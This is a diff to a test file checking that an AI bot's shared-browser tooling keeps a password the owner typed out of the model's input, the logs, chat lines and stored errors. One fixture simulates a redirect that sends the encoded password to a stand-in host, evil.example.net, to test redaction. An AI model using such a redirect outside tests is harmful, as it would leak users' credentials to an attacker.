@@ -38,8 +38,9 @@ const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
 const block = body => `Let me look.\n\`\`\`browser\n${JSON.stringify(body)}\n\`\`\`\nBack soon.`;
 
 /** The marker, and every spelling a site may give it back in. */
-const makeMarker = () => `Planted-${randomUUID().replace(/-/g, '').slice(0, 10)}-Zq9`;
-const spellings = marker => [marker, marker.toUpperCase(), marker.toLowerCase(), encodeURIComponent(marker), encodeURIComponent(marker).toLowerCase()];
+// It holds a space, `&` and `+`, so its percent-encoded spelling is not the marker itself and is really exercised.
+const makeMarker = () => `Planted-${randomUUID().replace(/-/g, '').slice(0, 10)}&Zq9 +1`;
+const spellings = marker => [marker, marker.toUpperCase(), marker.toLowerCase(), encodeURIComponent(marker), encodeURIComponent(marker).toLowerCase(), encodeURIComponent(marker).replace(/%20/g, '+')];
 /** The names of the sinks that hold the marker, never the marker itself. */
 const holding = (marker, sinks) => Object.entries(sinks).filter(([, text]) => {
   const lower = String(text).toLowerCase();
@@ -70,15 +71,20 @@ async function rig(t, {device = true} = {}) {
     s.grants = [{botId: 'web', action: 'browser.use', scope: `https://${HOST}`, choice: 'always', at: new Date().toISOString()}];
   });
   const bodies = [];
+  const ask = {blocks: 1};
   const executor = async (_bot, raw) => {
     bodies.push(String(raw));
-    return JSON.parse(raw).page ? 'I read it.' : block({url: PAGE, steps: [{op: 'read', selector: 'main'}]});
+    // The bot asks for the page once per run it is started for; after that it answers with what it has.
+    if (JSON.parse(raw).page || ask.blocks <= 0) return 'I read it.';
+    ask.blocks--;
+    return block({url: PAGE, steps: [{op: 'read', selector: 'main'}]});
   };
   const hooks = {continueRun: async () => {}, resumeBrowser: (s, request, options) => resumeBrowserRun(s, request, {...options, executor})};
   setBrowserResultHooks(hooks);
   const paired = device ? agent.redeemPairing(store, {code: agent.createPairing(store, 'default', {}).code, name: 'Laptop', permissions: ['browser.action']}) : null;
   /** The bot is asked to look at the page. Its request goes to the device (or waits). */
   const startRun = async id => {
+    ask.blocks = 1;
     await store.update(s => { s.groupRuns.push(createRun({group: s.groups[0], message: 'Find the docs', makeId: () => id, chatKey: 'web'})); });
     await runGroup(store, id, executor);
     return store.read().browserRequests.find(r => r.runId === id);
@@ -118,7 +124,8 @@ test('the device path: a secret the owner typed reaches no model, log, chat line
   const marker = makeMarker();
   const r = await rig(t);
   const pages = {[PAGE]: {title: 'Sign in', text: 'Enter your code', elements: [{index: 1, tag: 'input', type: 'password', text: 'password field'}]}};
-  const sb = createSharedBrowser({allow: [HOST], settleMs: 0, start: async () => startBrowserSession({connection: fakeCdp({pages}).connection})});
+  const fake = fakeCdp({pages});
+  const sb = createSharedBrowser({allow: [HOST], settleMs: 0, start: async () => startBrowserSession({connection: fake.connection})});
   t.after(() => sb.close());
   const lines = await consoleOf(async () => {
     // The owner signs in through the Computer view's masked field, and the site then echoes what it was given.
@@ -126,7 +133,11 @@ test('the device path: a secret the owner typed reaches no model, log, chat line
     await sb.takeover('web');
     await sb.applyInput('web', {type: 'type', text: marker, secret: true});
     await sb.applyInput('web', {type: 'key', key: 'Enter'});
+    // The page's own clearing fails and says the typed text in its error: the device logs fixed words, and hands back anyway.
+    fake.hook('Runtime.evaluate', async ({expression}) => { if (expression.includes('clearSecrets')) throw new Error(`The page said no to ${marker}`); });
     await sb.handback('web');
+    fake.hook('Runtime.evaluate', async () => undefined);
+    assert.equal(sb.owner(), null, 'handed back all the same');
     pages[PAGE] = echoing(marker);
     // The bot asks for the page; the device runs it with the code that runs on a real device.
     const request = await r.startRun('run-device');
@@ -138,7 +149,23 @@ test('the device path: a secret the owner typed reaches no model, log, chat line
     agent.completeAgentTask(r.store, r.paired.agentId, task.id, {status: 'done', result});
     await onAgentTaskResult(r.store, task.id, r.hooks);
     await until(() => r.store.read().groupRuns.find(x => x.id === 'run-device')?.status === 'completed', 'the run to finish');
+    // A second page fails: the site sent the tab to an address nobody allowed, with the echo in it. The error text
+    // travels to the store and into a chat line, so it must be hidden before it leaves the device.
+    await r.startRun('run-fail');
+    const [failing] = agent.claimAgentTasks(r.store, r.paired.agentId);
+    fake.hook('Page.navigate', async (params, sessionId) => {
+      fake.emit('Fetch.requestPaused', {requestId: 'r1', request: {url: `https://evil.example.net/?pw=${encodeURIComponent(marker)}`}, resourceType: 'Document'}, sessionId);
+      return {errorText: 'net::ERR_BLOCKED_BY_CLIENT'};
+    });
+    const error = await runBrowserTask({kind: failing.kind, payload: JSON.parse(failing.payload)}, {shared: sb, allow: [HOST], env: {AGENT_BROWSER: '1'}}).then(() => null, e => e);
+    assert.ok(error && /The page was not opened/.test(error.message), 'the page failed');
+    agent.completeAgentTask(r.store, r.paired.agentId, failing.id, {status: 'failed', error: error.message});
+    await onAgentTaskResult(r.store, failing.id, r.hooks);
   });
+  const failed = r.store.read().browserRequests.find(x => x.status === 'failed');
+  assert.ok(failed && /\[hidden\]/.test(failed.error || ''), 'the stored failure names the page it could not open, with the echo hidden');
+  assert.ok(r.store.read().chats.web.some(m => /browser request failed/.test(m.text || '')), 'and a chat line says so');
+  assert.ok(lines.includes('agent: could not empty the secret fields on the page.'), 'the device wrote a log line, in fixed words');
   assert.ok(r.bodies.some(body => JSON.parse(body).page?.includes('[hidden]')), 'the bot was handed the page with the secret hidden');
   assert.deepEqual(holding(marker, {...r.sinks(), 'the console': lines}), []);
 });
@@ -177,12 +204,14 @@ test('the server path: a hand back that stores a run carries no typed secret', a
 
 test('the assertions can fail: a marker that is left in a sink is found, in any case and encoded', () => {
   const marker = makeMarker();
+  assert.notEqual(encodeURIComponent(marker), marker, 'the marker has characters that are percent-encoded');
+  assert.deepEqual(holding(marker, {form: `?pw=${encodeURIComponent(marker).replace(/%20/g, '+')}`}), ['form']);
   for (const text of [marker, marker.toUpperCase(), `?x=${encodeURIComponent(marker)}`, `a ${marker.toLowerCase()} b`]) assert.deepEqual(holding(marker, {sink: text}), ['sink']);
   assert.deepEqual(holding(marker, {sink: '[hidden] and planted'}), []);
 });
 
 const browser = findBrowser();
-test('a real Chrome: typed in secret, echoed by the next page, and the page\'s field emptied after the submit', {skip: !browser && 'no browser installed', timeout: 90000}, async t => {
+test('a real Chrome: typed in secret, echoed by the next page, and the page\'s field emptied at the hand back', {skip: !browser && 'no browser installed', timeout: 90000}, async t => {
   const marker = makeMarker();
   // A site that keeps the last failed sign-in and shows it back on every page load: in the title, in the text and
   // in a plain field it draws again. Its form never navigates; a script sends the attempt and the page stays.
@@ -220,11 +249,13 @@ test('a real Chrome: typed in secret, echoed by the next page, and the page\'s f
     await shared.applyInput('web', {type: 'type', text: marker, secret: true});
     assert.ok(JSON.parse(await field()).value === marker, 'the owner typed it into the real field');
     await shared.applyInput('web', {type: 'click', x: 100, y: 100});
-    await until(() => last === marker, 'the site to get the attempt: the clearing must not cut the submit short');
-    await sleep(2200);
-    const after = JSON.parse(await field());
-    assert.ok(after.value === '' && after.attr === false, 'the password field was emptied after the submit');
+    await until(() => last === marker, 'the site to get the attempt');
+    // A submit does not empty the field: a slow or captcha submit may not have read it yet. Only the hand back does.
+    await sleep(2000);
+    assert.ok(JSON.parse(await field()).value === marker, 'the field kept what was typed until the owner handed back');
     await shared.handback('web');
+    const after = JSON.parse(await field());
+    assert.ok(after.value === '' && after.attr === false, 'the password field was emptied when the owner handed back');
     // The bot reloads the page, which now echoes the attempt, and reads it.
     const result = await shared.run('web', {url: base, steps: [{op: 'waitFor', selector: '#again'}, {op: 'read', selector: 'main'}]});
     assert.ok(result.actions.every(a => a.ok), 'the page showed what the site drew');
